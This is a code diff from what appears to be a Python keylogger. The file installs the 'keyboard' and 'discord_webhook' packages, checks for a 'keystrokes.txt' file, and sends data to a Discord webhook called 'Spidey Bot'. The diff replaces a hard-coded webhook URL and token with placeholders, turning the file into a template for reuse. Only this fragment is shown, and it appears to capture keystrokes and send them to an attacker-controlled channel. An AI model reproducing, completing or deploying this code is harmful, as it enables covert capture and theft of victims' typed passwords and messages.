@@ -6,7 +6,7 @@ os.system(f"pip install keyboard discord_webhook")
 import keyboard
 from discord_webhook import DiscordWebhook
 
-webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1233813508907597905/g-G10KDBYHdAARXE-vQyKpR1rwh6A2McIuXsHl0PUZeAwMxXvCd0rfWq4v5t4oH8pUtX', username="Spidey Bot")
+webhook = DiscordWebhook(url='#discord_webhook_url', username="#bot_name")
 
 check_file = os.path.isfile('keystrokes.txt')
 
